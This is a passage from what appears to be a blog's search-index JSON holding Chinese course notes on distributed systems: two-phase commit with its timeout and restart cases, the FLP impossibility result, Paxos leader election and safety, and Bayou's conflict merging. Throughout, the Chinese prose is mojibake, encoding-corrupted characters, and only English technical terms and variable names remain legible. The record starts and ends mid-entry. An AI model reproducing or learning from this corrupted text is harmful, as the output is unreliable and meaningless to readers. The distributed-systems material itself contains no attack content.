å¯¹ç½‘ç»œå»¶è¿Ÿå®¹å¿åº¦æ›´é«˜ æ›´å®¹æ˜“ç§»æ¤åˆ°ä¸åŒå¹³å° ","date":"2021-10-18","objectID":"/distributed-systems/:5:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"2PC NFS å’Œ Ivy éƒ½æ²¡æœ‰å¤„ç†ç³»ç»Ÿä¸­èŠ‚ç‚¹æ•…éšœçš„é—®é¢˜ã€‚åœ¨ä¸€äº›åœºæ™¯ä¸‹ï¼ˆæ¯”å¦‚é“¶è¡Œè½¬å¸ï¼‰ï¼Œæˆ‘ä»¬å¸Œæœ›å½“å‚ä¸çš„èŠ‚ç‚¹æ•…éšœæ—¶ï¼Œæ‰€æœ‰å‚ä¸çš„èŠ‚ç‚¹è¦ä¹ˆéƒ½å®ŒæˆçŠ¶æ€å˜æ›´ï¼Œè¦ä¹ˆéƒ½æ²¡æœ‰çŠ¶æ€å˜æ›´ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬æ˜¾ç„¶ä¸å¸Œæœ›å‘èµ·è½¬è´¦çš„èŠ‚ç‚¹è¢«æ‰£é™¤äº†ä½™é¢ï¼Œè€Œæ”¶åˆ°è½¬è´¦çš„èŠ‚ç‚¹æ²¡æœ‰å¢åŠ ä½™é¢ã€‚ 2PCï¼ˆTwo-Phase Commitï¼‰å³ä¸¤é˜¶æ®µæäº¤ï¼Œé€šè¿‡ä¸€ç§éå¸¸ç®€å•çš„æ€è·¯æ¥ç¡®ä¿ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹èƒ½è¾¾æˆå…±è¯†ã€‚å¦‚æœè¿™ç§ all-or-nothing çš„è¯­ä¹‰èƒ½å¤Ÿè¢«æ­£ç¡®æ‰§è¡Œï¼Œå³è¦ä¹ˆå…¨ commit è¦ä¹ˆå…¨ abortï¼Œé‚£ä¹ˆå°±è¾¾æˆäº† Safety çš„ç›®æ ‡ï¼›å¦‚æœåœ¨æ²¡æœ‰æ•…éšœçš„æƒ…å†µä¸‹èƒ½å°½å¿«å…¨ commitï¼Œå¹¶åœ¨å‡ºç°æ•…éšœçš„æƒ…å†µä¸‹å°½å¿«å†³å®šæ˜¯ commit è¿˜æ˜¯ abortï¼Œé‚£ä¹ˆå°±è¾¾æˆäº† Liveness ç›®æ ‡ã€‚æ˜¾ç„¶ï¼ŒSafety å’Œ Liveness ä¸¤è€…ä¹‹é—´éœ€è¦æƒè¡¡ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å¼•å…¥äº¤æ˜“åè°ƒè€… TCã€‚å‡è®¾ç³»ç»Ÿä¸­åªæœ‰ä¸¤ä¸ªèŠ‚ç‚¹ A å’Œ Bï¼Œé‚£ä¹ˆ TC å…ˆå‘ä¸¤è€…å‘é€ prepare æ¶ˆæ¯ã€‚A å’Œ B éšåå›å¤ä»–ä»¬æ˜¯å¦èƒ½å¤Ÿ commitã€‚å¦‚æœ TC æ”¶åˆ°äº†ä¸¤ä¸ª Yesï¼Œé‚£ä¹ˆå°±ä¼šå‘ä¸¤è€…å‘é€ commit æ¶ˆæ¯ï¼›å¦‚æœ TC æ”¶åˆ°äº†è‡³å°‘ä¸€ä¸ª Noï¼Œé‚£ä¹ˆå°±ä¼šå‘ä¸¤è€…å‘é€ abort æ¶ˆæ¯ã€‚æœ€åï¼ŒA å’Œ B æ ¹æ® TC çš„æŒ‡ä»¤å®Œæˆç›¸åº”åŠ¨ä½œã€‚ æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºï¼Œä¸Šè¿°åšæ³•ä¸€å®šèƒ½ä¿è¯ Safetyã€‚ä½†æ˜¯ï¼Œå¦‚æœï¼š ä»»æ„èŠ‚ç‚¹ï¼ˆTC / A / Bï¼‰æ¥æ”¶æ¶ˆæ¯æ—¶è¶…æ—¶äº†ï¼ˆå®•æœºã€ä¸¢åŒ…ç§ç§åŸå› ï¼‰ ä»»æ„èŠ‚ç‚¹é‡å¯äº† æˆ‘ä»¬éƒ½æ— æ³•ä¿è¯ Liveness äº†ï¼Œå› ä¸º TC å¯èƒ½åœ¨èƒ½å¤Ÿ commit çš„æƒ…å†µä¸‹é€‰æ‹©äº† abortã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:6:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"è¶…æ—¶çš„æƒ…å†µ ä¸ºäº†å¤„ç†è¶…æ—¶çš„æƒ…å†µï¼Œç¡®ä¿ Safety çš„å‰æä¸‹å°½é‡ä¿è¯ Livenessï¼š æˆ‘ä»¬å¯ä»¥è®© TC ç­‰å¾… Yes / No æ¶ˆæ¯è¶…æ—¶çš„æ—¶å€™é€‰æ‹© abort æ¥å°½å¿«ä½œå‡ºå†³å®šï¼Œä½†æ­¤æ—¶ä¾ç„¶æœ‰å¯èƒ½åœ¨èƒ½ commit çš„æƒ…å†µä¸‹é€‰æ‹©äº† abortï¼Œè¿‡äºä¿å®ˆã€‚ æˆ‘ä»¬å¯ä»¥è®© A / B ç­‰å¾… commit / abort æ¶ˆæ¯è¶…æ—¶çš„æ—¶å€™è‡ªåŠ¨é€‰æ‹© commitï¼Œä½†ç”±äºå¦ä¸€æ–¹å¯èƒ½å›å¤äº† Noï¼Œè¿™æ ·å¾ˆå¯èƒ½å¤±å» Safetyã€‚ æˆ‘ä»¬å¯ä»¥è®© A / B ç­‰å¾… commit / abort æ¶ˆæ¯è¶…æ—¶çš„æ—¶å€™è‡ªåŠ¨é€‰æ‹© abortã€‚ä¸å¤±ä¸€èˆ¬æ€§ï¼Œå‡å¦‚ B ä¹‹å‰å›å¤äº† Noï¼Œé‚£ä¹ˆè¶…æ—¶è‡ªåŠ¨ abort ä¸ä¼šå‡ºé—®é¢˜ï¼Œä¹Ÿèƒ½ä¿è¯ Livenessï¼›ä½†å¦‚æœ B ä¹‹å‰å›å¤äº† Yesï¼Œé‚£ä¹ˆ TC å°±æœ‰å¯èƒ½æ”¶åˆ°ä¸¤ä¸ª Yesï¼Œç„¶åç»™ A å‘é€ commitï¼Œè€Œç»™ B å‘é€çš„ commit æ²¡æœ‰é€è¾¾ã€‚æ­¤æ—¶ A é€‰æ‹© commit è€Œ B è‡ªåŠ¨ abort äº†ï¼Œå¤±å»äº† Safetyï¼ è‡³æ­¤ï¼Œæˆ‘ä»¬è§£å†³äº†é—®é¢˜çš„ä¸€åŠï¼šB å¦‚æœä¹‹å‰å›å¤äº† Noï¼Œé‚£ä¹ˆåªè¦è¶…æ—¶è‡ªåŠ¨ abort å°±å¥½äº†ã€‚ è€Œå¦‚æœ B ä¹‹å‰å›å¤äº† Yesï¼Œé‚£ä¹ˆå®ƒå¯ä»¥å‘ A å‘é€ status æ¶ˆæ¯ï¼Œè¯¢é—® A çš„çŠ¶æ€ï¼š å¦‚æœ A æ²¡æœ‰å›å¤ï¼ŒB æ— æ³•å†³å®šï¼Œåªèƒ½ç»§ç»­æ°¸è¿œç­‰ TC çš„æ¶ˆæ¯ï¼› å¦‚æœ A æ”¶åˆ°äº† commit / abort å¹¶å›å¤ç»™äº† B ï¼ŒB å°±åšç›¸åŒçš„å†³å®šï¼› å¦‚æœ A è¿˜æ²¡æœ‰å›å¤ Yes / Noï¼Œä¸¤è€…éƒ½ abortï¼ˆæ­¤æ—¶ TC ä¸å¯èƒ½å†³å®šå…¨ commitï¼‰ï¼› å¦‚æœ A æ²¡æ”¶åˆ° commit / abort ä½†ä¹‹å‰å›å¤äº† Noï¼Œä¸¤è€…éƒ½ abortï¼› å¦‚æœ A æ²¡æ”¶åˆ° commit / abort ä½†ä¹‹å‰å›å¤äº† Yesï¼ŒB åŒæ ·æ— æ³•å†³å®šï¼Œå› ä¸ºæ— æ³•åˆ¤æ–­ TC æ˜¯ä¸æ˜¯æ”¶åˆ°äº†ä¸¤è€…çš„ Yes å¹¶å†³å®š commit äº†ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å‘ç°å³ä½¿é‡‡ç”¨äº†è¿™æ ·çš„ç»ˆæ­¢åè®®å¹¶ä¿è¯äº† Safetyï¼ŒLiveness ä¾ç„¶æ— æ³•ä¿è¯ï¼ŒTC å®•æœº / TC çš„æ¶ˆæ¯ä¸¢äº†çš„æƒ…å†µä¸‹ï¼ŒA / B ä¾ç„¶éœ€è¦æ°¸è¿œç­‰å¾… TCã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:6:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"é‡å¯çš„æƒ…å†µ é‡å¯çš„ TC å¯èƒ½ä¸çŸ¥é“è‡ªå·±å‘é€è¿‡ commitï¼Œé‡å¯çš„ A / B å¯èƒ½ä¸çŸ¥é“è‡ªå·±å‘é€è¿‡ Yesï¼Œç»“åˆä¸¢åŒ…çš„å¯èƒ½æ€§ï¼Œè¿™ä½¿å¾—ä½œå‡ºèƒ½ä¿è¯ Safety çš„å†³å®šä¹Ÿä¸é‚£ä¹ˆå®¹æ˜“äº†ã€‚ å¯¹äºè¿™ç±»é—®é¢˜ï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿé‡‡ç”¨çš„ä¸€ç§é€šç”¨æ–¹æ¡ˆå°±æ˜¯å€ŸåŠ©æŒä¹…åŒ–å­˜å‚¨ã€‚TC å‘é€ commit å‰å…ˆå†™ä¸€æ¡è®°å½•åˆ°ç£ç›˜ï¼ŒA / B åœ¨å‘é€ Yes å‰ä¹Ÿå…ˆå†™ä¸€æ¡è®°å½•åˆ°ç£ç›˜ï¼Œå°±èƒ½ä½¿çŠ¶æ€è¢«ä¿ç•™ä¸‹æ¥ã€‚ å› æ­¤ï¼Œåªéœ€è¦ï¼š TC é‡å¯åï¼Œå¦‚æœç£ç›˜ä¸Šæ²¡æœ‰ commit æ¶ˆæ¯ï¼Œå°± abortï¼› A / B é‡å¯åï¼Œå¦‚æœç£ç›˜ä¸Šæ²¡æœ‰ Yes æ¶ˆæ¯ï¼Œå°± abortï¼› A / B é‡å¯åï¼Œå¦‚æœç£ç›˜ä¸Šæœ‰ Yes æ¶ˆæ¯ï¼Œå°±ä½¿ç”¨ä¸Šè¿°çš„ç»ˆæ­¢åè®®ä½œå†³å®š ","date":"2021-10-18","objectID":"/distributed-systems/:6:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"FLP Result åˆ†æäº† 2PC åè®®ä¹‹åï¼Œæˆ‘ä»¬å‘ç°å°½ç®¡å®ƒèƒ½ä¿è¯ Safetyï¼Œä½†å´ä¸èƒ½åœ¨æ‰€æœ‰æƒ…å†µä¸‹ä¿è¯ Livenessã€‚å®é™…ä¸Šï¼Œæ ¹æ® FLP Resultï¼Œå¼‚æ­¥æ¶ˆæ¯ä¼ é€’å¼çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œåªè¦æœ‰ä¸€å°æœºå™¨å­˜åœ¨å®•æœºä¸”ä¸æ¢å¤çš„å¯èƒ½ï¼ˆcrash-failureï¼‰ï¼Œå°±ä¸å­˜åœ¨ç¡®å®šæ€§çš„å…±è¯†ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸å¯èƒ½åŒæ—¶ä¿è¯ Safety å’Œ Livenessã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:6:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Paxos ç§° Paxos ä¸ºåˆ†å¸ƒå¼é¢†åŸŸæœ€é‡è¦çš„ç®—æ³•åº”è¯¥ä¸ä¼šæœ‰å¤ªå¤§äº‰è®®ã€‚Paxos å®é™…ä¸Šå¯ä»¥è®¤ä¸ºæ˜¯ 2PC çš„å‡çº§ç‰ˆï¼Œå› ä¸ºä¸¤è€…éƒ½æ˜¯ä¸ºäº†è§£å†³å…±è¯†é—®é¢˜ï¼Œåªä¸è¿‡ Paxos é€šè¿‡æ›´å¤æ‚çš„æœºåˆ¶è·å¾—äº†æ›´é«˜çš„å¯ç”¨æ€§ã€‚åœ¨ä¹‹å‰ä»‹ç»çš„æ¡ˆä¾‹ä¸­ï¼ˆNFSã€Ivyã€2PCï¼‰å…¶å®éƒ½æ²¡æœ‰å°†å¯ç”¨æ€§çº³å…¥è€ƒé‡ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:7:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å…±è¯†ç®—æ³• éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒPaxos æ˜¯å…±è¯†ç®—æ³•è€Œä¸æ˜¯ä¸€è‡´æ€§ç®—æ³•ï¼Œå°½ç®¡è¿™ä¸¤ä¸ªæ¦‚å¿µå¾ˆç›¸ä¼¼ã€‚å…±è¯†æŒ‡çš„æ˜¯ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹å¯¹æŸä¸ª / æŸäº›å˜é‡çš„å€¼ã€æˆ–è€…æ˜¯æŸä¸ªæ¦‚å¿µã€æŸä¸ªè¡ŒåŠ¨èƒ½å¤Ÿè¾¾æˆå…±è¯†ï¼Œè€Œä¸€è‡´æ€§åˆ™æŒ‡çš„æ˜¯ä¸åŒçš„åˆ†å¸ƒå¼æ•°æ®åº“èŠ‚ç‚¹ä¸Šï¼Œå­˜å‚¨çš„æ•°æ®æ˜¯å¦ä¸€è‡´ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:7:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ğŸŒ° Primary é€‰ä¸¾ å‡å¦‚æœ‰è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼šæˆ‘ä»¬è¦é€‰æ‹©ä¸€ä¸ªèŠ‚ç‚¹ä½œä¸º primaryï¼Œè´Ÿè´£æ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚å¹¶åˆ†å‘ç»™å…¶ä»– backup èŠ‚ç‚¹ã€‚ä½†æ˜¯ primary çš„å¼•å…¥åŒæ—¶ä¹Ÿä¼šå¼•å…¥å•ç‚¹æ•…éšœé—®é¢˜ï¼Œæ­¤æ—¶å¯èƒ½å°±éœ€è¦é€‰å‡ºä¸€ä¸ªæ–°çš„ primaryï¼Œè¿™æ—¶å°±ä¼šææ˜“äº§ç”Ÿå¤šäºä¸€ä¸ª primaryã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸‹ï¼ŒPaxos è¦è§£å†³çš„é—®é¢˜å°±æ˜¯ï¼šç¡®ä¿æ‰€æœ‰èŠ‚ç‚¹æœ€ç»ˆåªä¼šé€‰å‡ºä¸€ä¸ª primaryã€‚è€Œå¯¹äºå…¶ä»–ä¸åŒåœºæ™¯ï¼ŒPaxos è§£å†³çš„é—®é¢˜ä¹Ÿå¯ä»¥ä¸åŒã€‚ ä¸€ä¸ªå¾ˆè‡ªç„¶çš„æƒ³æ³•æ˜¯ç»™æ¯ä¸ªèŠ‚ç‚¹é¢„å…ˆç¼–å·ï¼Œå½“å‰å­˜æ´»çš„èŠ‚ç‚¹ä¸­ç¼–å·æœ€å°çš„å½“é€‰ã€‚è¿™å°±éœ€è¦æ‰€æœ‰èŠ‚ç‚¹å¯¹â€œå½“å‰å­˜æ´»çš„èŠ‚ç‚¹é›†åˆâ€è¿™ä¸ªå€¼è¾¾æˆå…±è¯†ã€‚ç„¶è€Œæœªå¿…æ‰€æœ‰èŠ‚ç‚¹éƒ½èƒ½å¤Ÿæ­£å¸¸åœ°ç»™å‡ºè‡ªå·±çš„åé¦ˆï¼Œå› æ­¤åªéœ€è¦æŸä¸ªå€¼è¢«è¶…è¿‡åŠæ•°èŠ‚ç‚¹åŒæ„ï¼Œæˆ‘ä»¬å°±è®¤ä¸ºèŠ‚ç‚¹å…³äºè¿™ä¸ªå€¼è¾¾æˆäº†å…±è¯†ã€‚ è¿™å®é™…ä¸Šè¡¨æ˜ï¼ŒPaxos èƒ½æˆåŠŸæ‰§è¡Œå¿…é¡»è¦è‡³å°‘åŠæ•°ä»¥ä¸Šçš„èŠ‚ç‚¹å­˜æ´»ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:7:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å…±è¯†åå•† ç”±äºå¯èƒ½å‡ºç°ç½‘ç»œä¸¢åŒ…å’Œç½‘ç»œåˆ†åŒºï¼Œå•çº¯çš„äº’ ping æ¥ç¡®å®šå“ªäº›èŠ‚ç‚¹å­˜æ´»æ˜¯è¡Œä¸é€šçš„ã€‚ä¸ºæ­¤ï¼ŒPaxos å¼•å…¥äº† Leader æœºåˆ¶ã€‚å½“ä¸€ä¸ªèŠ‚ç‚¹å†³å®šæˆä¸º Leader åï¼Œå®ƒä¼šå‘åŒ…æ‹¬è‡ªèº«åœ¨å†…çš„æ‰€æœ‰èŠ‚ç‚¹å¹¿æ’­ä¸€ä¸ª proposalï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ª proposal åºå· n å’Œç›¸åº”çš„å€¼ valueï¼ˆåœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œæ˜¯å­˜æ´»èŠ‚ç‚¹é›†åˆï¼Œä¸‹ä¸èµ˜è¿°ï¼‰ã€‚n å¿…é¡»æ˜¯å…¨å±€å”¯ä¸€çš„ï¼Œä¸€èˆ¬å–ç›®å‰å­˜åœ¨çš„æœ€å¤§çš„ n çš„å€¼ + 1ã€‚ æˆ‘ä»¬ç”¨ n_aè¡¨ç¤ºèŠ‚ç‚¹ä¹‹å‰å·²ç» accept è¿‡çš„ proposal ä¸­æœ€å¤§çš„ nï¼Œç„¶åç”¨ v_a è¡¨ç¤ºå¯¹åº” proposal çš„ valueã€‚å†ç”¨ n_h è®°å½•èŠ‚ç‚¹æ‰€æ”¶åˆ°çš„ proposal ä¸­æœ€å¤§çš„ nã€‚å½“èŠ‚ç‚¹æ”¶åˆ°ä¸€ä¸ª proposalï¼Œå¹¶å‘ç°å…¶åºå· n å¤§äº n_h æ—¶ï¼Œå°±å°† n_h è®¾ä¸º nï¼Œå¹¶å‘ Leader å›å¤ (n_a, v_a)ã€‚ Leader æ”¶åˆ°äº†è¶…è¿‡åŠæ•°çš„è¿™æ ·çš„æ¶ˆæ¯åï¼Œå°±å¯ä»¥æŸ¥çœ‹å…¶ä¸­æ˜¯å¦æœ‰æŸä¸ª v_a éç©ºã€‚å¦‚æœæ‰€æœ‰ v_a éƒ½æ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆå°±è‡ªå·±é€‰æ‹©ä¸€ä¸ªå€¼ä½œä¸º valueï¼›å¦åˆ™ï¼Œå°±é€‰æ‹© n_a æœ€å¤§çš„é‚£ä¸ªæ¶ˆæ¯ä¸­çš„ v_a ä½œä¸º valueã€‚éšåï¼Œå‘è¿™æ¬¡å›å¤è¿‡è‡ªå·±çš„èŠ‚ç‚¹å¹¿æ’­ (n = æœ€å¤§çš„ n_a, v = é€‰æ‹©çš„ value)ã€‚ èŠ‚ç‚¹æ”¶åˆ°åï¼Œå¦‚æœå‘ç° n å¤§äºç­‰äº n_hï¼Œé‚£å°±æ¥æ”¶è¿™ä¸ª proposalã€‚æ‰€è°“æ¥æ”¶ proposalï¼Œå°±æ˜¯è®¾ç½® n_h = n_a = nï¼Œv_a = v æ¥æ›´æ–°è¿™å‡ æ¡è®°å½•ï¼Œéšåå›å¤ä¸€æ¡æ²¡æœ‰å†…å®¹çš„æ¶ˆæ¯ã€‚ Leader æ”¶åˆ°è¶…è¿‡åŠæ•°çš„è¿™æ ·çš„æ¶ˆæ¯åï¼Œå°±å¯ä»¥è®¤ä¸ºèŠ‚ç‚¹è¾¾æˆäº†å…±è¯†ï¼Œå¹¶å‘è¿™æ¬¡å›å¤è¿‡è‡ªå·±çš„èŠ‚ç‚¹å¹¿æ’­ä¸€æ¡æ²¡æœ‰å†…å®¹çš„æ¶ˆæ¯ï¼Œè¡¨ç¤ºå…±è¯†å·²è¾¾æˆã€‚èŠ‚ç‚¹æ”¶åˆ°æ¶ˆæ¯åï¼Œå°±çŸ¥é“æœ€ç»ˆè¾¾æˆçš„å…±è¯†çš„å€¼ä¸º v_aã€‚åœ¨é€‰ primary çš„ä¾‹å­é‡Œï¼Œv_a é›†åˆé‡Œåºå·æœ€å°çš„èŠ‚ç‚¹å°±æ˜¯å…¬è®¤çš„ primary äº†ã€‚ é‚£ä¹ˆï¼Œä¸€ä¸ªèŠ‚ç‚¹æ€ä¹ˆå†³å®šè‡ªå·±è¦æˆä¸º Leader å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œåªè¦ä¸ºæ¯ä¸ªèŠ‚ç‚¹è®¾ç½®ä¸€ä¸ªéšæœºçš„è¶…æ—¶æ—¶é—´ï¼Œä¸€æ—¦è¿‡äº†è¿™ä¸ªæ—¶é—´ä¾ç„¶æ²¡æœ‰æ¥è‡ª Leader çš„æ¶ˆæ¯ï¼ŒèŠ‚ç‚¹å°±ä¼šè‡ªå·±æˆä¸º Leaderã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:7:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Safety Paxos èƒ½ä¿è¯ Safety çš„å…³é”®åœ¨äºï¼š ä»»ä½•èŠ‚ç‚¹æ”¶åˆ°ä¸€ä¸ª n \u003c n_h çš„æ¶ˆæ¯åï¼Œéƒ½ä¼šç›´æ¥æ— è§†ï¼Œè¿™ä½¿å¾—å³ä½¿å‡ºç°å¤šä¸ª Leaderï¼ŒèŠ‚ç‚¹æœ€ç»ˆä¹Ÿåªä¼š accept é‚£ä¸ªåºå·æœ€å¤§çš„ proposalï¼ˆæ³¨æ„ n æ˜¯å…¨å±€å”¯ä¸€çš„ï¼‰ ä»»æ„ä¸¤ä¸ªâ€œè¶…è¿‡åŠæ•°â€çš„é›†åˆä¹‹é—´å¿…å®šå­˜åœ¨äº¤é›†ï¼Œè¿™æ˜¯ç”±â€œè¶…è¿‡åŠæ•°â€çš„å®šä¹‰å¾—æ¥çš„ã€‚è¿™ä½¿å¾—å³ä½¿å‡ºç°å¤šä¸ª Leaderï¼Œå¹¶ä¸”éƒ½å‡ ä¹è·å¾—äº†è¶…è¿‡åŠæ•°çš„æ”¯æŒï¼Œæœ€ç»ˆä¹Ÿä¼šç”±è¿™ä¸ªäº¤é›†ä¸­çš„èŠ‚ç‚¹ï¼ˆå“ªæ€•åªæœ‰ä¸€ä¸ªï¼‰å†³å®šè¦ accept çš„ proposal æ–°çš„ proposal ä¼šæ²¿ç”¨ç°å­˜çš„ n_a æœ€å¤§çš„ proposal å¯¹åº”çš„ valueï¼Œè¿™ä½¿å¾—ä¸åŒ Leader å‘èµ·çš„å¤„äºä¸åŒé˜¶æ®µçš„ proposalï¼Œæ— æ³•å½±å“åˆ°æœ€ç»ˆè¾¾æˆå…±è¯†çš„ value ","date":"2021-10-18","objectID":"/distributed-systems/:7:4","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Bayou Bayou æ˜¯ä¸ºäº†ç§»åŠ¨è®¾å¤‡æ„å»ºæˆçš„åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡çš„ï¼Œè€Œç§»åŠ¨è®¾å¤‡ç»å¸¸ä¼šé‡åˆ°æ²¡æœ‰ç½‘ç»œæˆ–è€…ç½‘ç»œè´¨é‡å·®çš„æƒ…å†µï¼Œè¿™ä½¿å¾—å¾ˆå¤šé—®é¢˜ï¼Œæ¯”å¦‚æ•°æ®ä¸€è‡´æ€§ï¼Œçœ‹èµ·æ¥éå¸¸å›°éš¾ç”šè‡³ä¸å¯è§£ã€‚Bayou è§£å†³è¿™äº›é—®é¢˜çš„æ‰‹æ®µä¸»è¦æ˜¯é€šè¿‡èŠ‚ç‚¹é—´é€šä¿¡ï¼Œæ¯”å¦‚é€šè¿‡è“ç‰™ä¹‹ç±»çš„åè®®ä½¿å¾—ä¸¤éƒ¨æ‰‹æœºäº¤æ¢æ•°æ®æ¥è¾¾æˆä¸€è‡´æ€§ã€‚è¿™æ˜¯å› ä¸º Bayou ä¸»è¦æƒ³è§£å†³çš„é—®é¢˜å°±æ˜¯ä¸¥é‡ç½‘ç»œåˆ†åŒºæƒ…å†µä¸‹çš„æ•°æ®è¯»å†™å¯ç”¨æ€§ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:8:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ğŸŒ° ä¼šè®®å®¤é¢„è®¢ç³»ç»Ÿ Bayou ä½¿ç”¨äº†ä¸€ä¸ªä¼šè®®å®¤é¢„è®¢ç³»ç»Ÿæ¥è¯´æ˜åè®®çš„è¿ä½œåŸç†å’Œåœºæ™¯ã€‚æœ€ç»ˆï¼Œç³»ç»Ÿéœ€è¦ç¡®ä¿åŒä¸€æ—¶é—´æ®µåŒä¸€ä¼šè®®å®¤ä¸ä¼šè¢«ä¸¤ä¸ªç”¨æˆ·é¢„è®¢ã€‚ä¸ºæ­¤ï¼Œéœ€è¦ä¸€ç§è‡ªåŠ¨è§£å†³å†²çªçš„æœºåˆ¶ï¼Œä½¿å¾—ä¸åŒèŠ‚ç‚¹ä¸Šçš„æ•°æ®åŒæ­¥ä¹‹åèƒ½åƒ git é‚£æ · merge æ‰å†²çªã€‚ä¸ºäº†å®ç°è¿™ä¸ªæœºåˆ¶ï¼Œéœ€è¦èŠ‚ç‚¹ç»´æŠ¤ä¸€ä¸ªæ›´æ–°æ“ä½œçš„æœ‰åºåˆ—è¡¨ï¼Œå¹¶ç¡®ä¿èŠ‚ç‚¹æ”¶åˆ°çš„æ›´æ–°æ“ä½œæ˜¯ä¸€è‡´çš„ã€ä»¥åŠç¡®ä¿èŠ‚ç‚¹ä¼šæŒ‰ç›¸åŒçš„é¡ºåºé€ä¸ªåº”ç”¨è¿™äº›æ›´æ–°æ“ä½œã€‚è¿™æ ·ä¸€æ¥ï¼Œæ•°æ®åŒæ­¥å°±åªéœ€è¦åƒå½’å¹¶æ’åºé‚£æ ·ï¼Œåˆå¹¶ä¸¤ä¸ªæœ‰åºåˆ—è¡¨å³å¯ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:8:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å†²çªåˆå¹¶ ä¸è¿‡ Bayou å¹¶ä¸æ˜¯ä»…ä»…ç”¨äºä¼šè®®å®¤é¢„è®¢ç³»ç»Ÿï¼Œè€Œæ˜¯ä¸€ä¸ªé€šç”¨çš„åè®®ï¼Œå› 